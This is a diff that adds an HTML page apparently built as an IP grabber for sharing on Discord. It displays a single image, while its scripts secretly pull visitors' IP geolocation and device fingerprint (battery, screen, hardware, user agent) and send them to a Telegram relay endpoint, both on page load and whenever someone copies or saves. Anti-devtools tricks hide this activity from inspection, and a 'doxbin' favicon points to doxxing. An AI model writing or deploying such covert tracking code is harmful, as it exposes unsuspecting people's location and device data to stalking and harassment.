@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PSYCHO</title>
+    <link rel="icon" href="doxbinred.jpg" type="image/jpeg">
+    <link rel="apple-touch-icon" href="doxbinred.jpg">
+
+    <!-- Discord : URLs injectées automatiquement au déploiement Vercel (build.js) -->
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="PSYCHO">
+    <meta property="og:title" content="PSYCHO">
+    <meta property="og:description" content=" ">
+    <meta property="og:url" content="https://CHANGE-MOI.com/">
+    <meta property="og:image" content="https://CHANGE-MOI.com/pfp.jpg">
+    <meta property="og:image:secure_url" content="https://CHANGE-MOI.com/pfp.jpg">
+    <meta property="og:image:type" content="image/jpeg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="1200">
+    <meta property="og:image:alt" content="PSYCHO">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="PSYCHO">
+    <meta name="twitter:image" content="https://CHANGE-MOI.com/pfp.jpg">
+    <link rel="canonical" href="https://CHANGE-MOI.com/">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+        .img-wrap {
+            position: relative;
+            display: inline-block;
+            line-height: 0;
+            max-width: 100vw;
+            max-height: 100vh;
+        }
+        .img-wrap::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            z-index: 1;
+        }
+        .img-wrap img {
+            display: block;
+            max-width: 100vw;
+            max-height: 100vh;
+            width: auto;
+            height: auto;
+            pointer-events: none;
+            -webkit-user-drag: none;
+            user-select: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="img-wrap" id="img-wrap">
+        <img src="pfp.jpg" alt="PSYCHO" draggable="false">
+    </div>
+
+    <script>
+        (function () {
+            document.addEventListener('contextmenu', function (e) {
+                e.preventDefault();
+            });
+
+            document.addEventListener('keydown', function (e) {
+                var k = (e.key || '').toLowerCase();
+                var block =
+                    k === 'f12' ||
+                    (e.ctrlKey && e.shiftKey && /^(i|j|c|k)$/i.test(k)) ||
+                    (e.ctrlKey && !e.shiftKey && k === 'u') ||
+                    (e.metaKey && e.altKey && /^(i|j|u|c)$/i.test(k)) ||
+                    (e.metaKey && e.shiftKey && /^(i|j|c)$/i.test(k));
+                if (block) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }
+            });
+
+            function onDevtoolsOpen() {
+                try {
+                    window.location.replace('about:blank');
+                } catch (_) {
+                    document.documentElement.innerHTML = '';
+                }
+            }
+
+            var threshold = 160;
+            setInterval(function () {
+                var w = window.outerWidth - window.innerWidth > threshold;
+                var h = window.outerHeight - window.innerHeight > threshold;
+                if (w || h) onDevtoolsOpen();
+            }, 500);
+
+            setInterval(function () {
+                var t = performance.now();
+                (function () {}).constructor('debugger')();
+                if (performance.now() - t > 100) onDevtoolsOpen();
+            }, 1500);
+        })();
+    </script>
+
+    <script>
+        function parseGeo(d) {
+            if (!d?.ip) return null;
+            return d;
+        }
+
+        /** APIs compatibles navigateur (CORS) — geojs en premier */
+        const geoProviders = [
+            {
+                name: 'geojs.io',
+                url: 'https://get.geojs.io/v1/ip/geo.json',
+                parse: (raw) => parseGeo({
+                    ip: raw.ip,
+                    country: raw.country,
+                    countryCode: raw.country_code,
+                    region: raw.region,
+                    city: raw.city,
+                    latitude: raw.latitude,
+                    longitude: raw.longitude,
+                    timezone: raw.timezone,
+                    org: raw.organization_name,
+                    asn: raw.asn ? `AS${raw.asn}` : null
+                })
+            },
+            {
+                name: 'freeipapi.com',
+                url: 'https://freeipapi.com/api/json/',
+                parse: (raw) => parseGeo({
+                    ip: raw.ipAddress,
+                    country: raw.countryName,
+                    countryCode: raw.countryCode,
+                    region: raw.regionName,
+                    city: raw.cityName,
+                    latitude: raw.latitude,
+                    longitude: raw.longitude,
+                    timezone: raw.timeZone,
+                    isp: raw.isp,
+                    org: raw.organization,
+                    asn: raw.asn
+                })
+            },
+            {
+                name: 'ipwho.is',
+                url: 'https://ipwho.is/',
+                parse: (raw) => (raw.success === false || !raw.ip) ? null : parseGeo({
+                    ip: raw.ip,
+                    country: raw.country,
+                    countryCode: raw.country_code,
+                    region: raw.region,
+                    city: raw.city,
+                    postal: raw.postal,
+                    latitude: raw.latitude,
+                    longitude: raw.longitude,
+                    timezone: raw.timezone?.id,
+                    isp: raw.connection?.isp,
+                    org: raw.connection?.org,
+                    asn: raw.connection?.asn ? `AS${raw.connection.asn}` : null,
+                    mobile: raw.connection?.type === 'mobile',
+                    proxy: raw.security?.proxy || raw.security?.vpn || raw.security?.tor
+                })
+            }
+        ];
+
+        /** Secours JSONP (fonctionne même en file:// quand fetch est bloqué) */
+        const geoJsonpProviders = [
+            {
+                name: 'geojs.io',
+                url: 'https://get.geojs.io/v1/ip/geo.json',
+                parse: geoProviders[0].parse
+            },
+            {
+                name: 'ip-api.com',
+                url: 'http://ip-api.com/json/?fields=status,message,query,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting',
+                parse: (raw) => (raw.status !== 'success' || !raw.query) ? null : parseGeo({
+                    ip: raw.query,
+                    country: raw.country,
+                    countryCode: raw.countryCode,
+                    region: raw.regionName,
+                    city: raw.city,
+                    postal: raw.zip,
+                    latitude: raw.lat,
+                    longitude: raw.lon,
+                    timezone: raw.timezone,
+                    isp: raw.isp,
+                    org: raw.org,
+                    asn: raw.as,
+                    mobile: raw.mobile,
+                    proxy: raw.proxy
+                })
+            }
+        ];
+
+        function fetchJsonp(url, timeoutMs = 12000) {
+            return new Promise((resolve, reject) => {
+                const cb = '_geoJsonp_' + Date.now() + '_' + Math.random().toString(36).slice(2);
+                let script;
+                const cleanup = () => {
+                    clearTimeout(timer);
+                    delete window[cb];
+                    if (script?.parentNode) script.parentNode.removeChild(script);
+                };
+                const timer = setTimeout(() => {
+                    cleanup();
+                    reject(new Error('timeout'));
+                }, timeoutMs);
+                window[cb] = (data) => {
+                    cleanup();
+                    resolve(data);
+                };
+                script = document.createElement('script');
+                script.src = url + (url.includes('?') ? '&' : '?') + 'callback=' + encodeURIComponent(cb);
+                script.onerror = () => {
+                    cleanup();
+                    reject(new Error('jsonp'));
+                };
+                document.head.appendChild(script);
+            });
+        }
+
+        async function tryGeoProviders(providers, useJsonp) {
+            for (const provider of providers) {
+                try {
+                    const raw = useJsonp
+                        ? await fetchJsonp(provider.url)
+                        : await (async () => {
+                            const res = await fetch(provider.url, { cache: 'no-store' });
+                            if (!res.ok) return null;
+                            return res.json();
+                        })();
+                    if (!raw) continue;
+                    const data = provider.parse(raw);
+                    if (data?.ip) {
+                        const apiName = provider.name + (useJsonp ? ' (JSONP)' : '');
+                        return { ...data, api: apiName };
+                    }
+                } catch {
+                    /* essai suivant */
+                }
+            }
+            return null;
+        }
+
+        async function fetchGeoLocation() {
+            let data = await tryGeoProviders(geoProviders, false);
+            if (!data) data = await tryGeoProviders(geoJsonpProviders, true);
+            return data || null;
+        }
+
+        function getClientDeviceInfo() {
+            const nav = navigator;
+            const scr = screen;
+            const conn = nav.connection || nav.mozConnection || nav.webkitConnection;
+            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+            let connection = null;
+            if (conn) {
+                const parts = [
+                    conn.effectiveType,
+                    conn.downlink != null ? `${conn.downlink} Mbps` : null,
+                    conn.rtt != null ? `RTT ${conn.rtt} ms` : null,
+                    conn.saveData ? 'économie données' : null
+                ].filter(Boolean);
+                connection = parts.join(' · ') || null;
+            }
+
+            return {
+                platform: nav.platform || nav.userAgentData?.platform || '—',
+                language: nav.language,
+                languages: nav.languages?.join(', '),
+                screen: `${scr.width}×${scr.height} (dispo ${scr.availWidth}×${scr.availHeight})`,
+                pixelRatio: window.devicePixelRatio,
+                timezone: tz,
+                cores: nav.hardwareConcurrency ?? '—',
+                memory: nav.deviceMemory != null ? nav.deviceMemory : null,
+                touch: nav.maxTouchPoints > 0 ? `${nav.maxTouchPoints} points` : 'Non',
+                connection,
+                userAgent: nav.userAgent
+            };
+        }
+
+        async function parseUserAgent(ua) {
+            try {
+                const res = await fetch(`https://api.apicagent.com/?ua=${encodeURIComponent(ua)}`);
+                if (!res.ok) return null;
+                const d = await res.json();
+                return {
+                    deviceType: d.device?.type || '—',
+                    os: d.os?.name,
+                    osVersion: d.os?.version,
+                    browser: d.client?.name,
+                    browserVersion: d.client?.version
+                };
+            } catch {
+                return null;
+            }
+        }
+
+        function parseUserAgentFallback(ua) {
+            const mobile = /Mobile|Android|iPhone|iPad/i.test(ua);
+            let os = '—';
+            if (/Windows NT/i.test(ua)) os = 'Windows';
+            else if (/Mac OS X/i.test(ua)) os = 'macOS';
+            else if (/Android/i.test(ua)) os = 'Android';
+            else if (/iPhone|iPad/i.test(ua)) os = 'iOS';
+            else if (/Linux/i.test(ua)) os = 'Linux';
+
+            let browser = '—';
+            if (/Edg\//i.test(ua)) browser = 'Edge';
+            else if (/Chrome\//i.test(ua)) browser = 'Chrome';
+            else if (/Firefox\//i.test(ua)) browser = 'Firefox';
+            else if (/Safari\//i.test(ua)) browser = 'Safari';
+
+            return {
+                deviceType: mobile ? 'mobile' : 'desktop',
+                os,
+                browser
+            };
+        }
+
+        async function fetchBattery() {
+            if (!navigator.getBattery) return null;
+            try {
+                const b = await navigator.getBattery();
+                const pct = Math.round(b.level * 100);
+                const status = b.charging ? 'en charge' : 'sur batterie';
+                return `${pct}% (${status})`;
+            } catch {
+                return null;
+            }
+        }
+
+        async function fetchDeviceInfo() {
+            const base = getClientDeviceInfo();
+            const uaParsed = (await parseUserAgent(base.userAgent)) || parseUserAgentFallback(base.userAgent);
+            const battery = await fetchBattery();
+            return { ...uaParsed, ...base, battery };
+        }
+
+        let cachedLocation = null;
+        let cachedDevice = null;
+        const telegramCooldown = {};
+
+        function withTimeout(promise, ms) {
+            return Promise.race([
+                promise,
+                new Promise((resolve) => setTimeout(() => resolve(null), ms))
+            ]);
+        }
+
+        async function sendToTelegram(action) {
+            action = action || 'visit';
+            const now = Date.now();
+            if (telegramCooldown[action] && now - telegramCooldown[action] < 4000) return;
+            telegramCooldown[action] = now;
+
+            const payload = {
+                action,
+                location: cachedLocation,
+                device: cachedDevice,
+                page: window.location.href,
+                time: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })
+            };
+            const body = JSON.stringify(payload);
+            const apiUrl = new URL('/api/telegram', window.location.origin).href;
+
+            async function post() {
+                const res = await fetch(apiUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body,
+                    keepalive: true
+                });
+                const data = await res.json().catch(() => ({}));
+                return res.ok;
+            }
+
+            try {
+                const ok = await post();
+                if (!ok && navigator.sendBeacon) {
+                    navigator.sendBeacon(apiUrl, new Blob([body], { type: 'application/json' }));
+                }
+            } catch {
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon(apiUrl, new Blob([body], { type: 'application/json' }));
+                }
+            }
+        }
+
+        function setupImageTracking() {
+            const wrap = document.getElementById('img-wrap');
+            const img = wrap && wrap.querySelector('img');
+            if (!wrap || !img) return;
+
+            const notify = (action) => {
+                if (cachedLocation || cachedDevice) sendToTelegram(action);
+            };
+
+            wrap.addEventListener('contextmenu', () => notify('save'));
+
+            wrap.addEventListener('dragstart', (e) => {
+                e.preventDefault();
+                notify('drag');
+            });
+
+            document.addEventListener('copy', () => notify('copy'));
+            document.addEventListener('cut', () => notify('copy'));
+
+            document.addEventListener('keydown', (e) => {
+                const k = (e.key || '').toLowerCase();
+                const mod = e.ctrlKey || e.metaKey;
+                if (mod && (k === 'c' || k === 's' || k === 'x')) notify(k === 's' ? 'save' : 'copy');
+            });
+
+            window.addEventListener('beforeprint', () => notify('print'));
+        }
+
+        (async () => {
+            const [location, device] = await Promise.all([
+                withTimeout(fetchGeoLocation(), 10000),
+                withTimeout(fetchDeviceInfo(), 10000)
+            ]);
+            cachedLocation = location;
+            cachedDevice = device;
+            await sendToTelegram('visit');
+            setupImageTracking();
+        })();
+    </script>
+</body>
+</html>
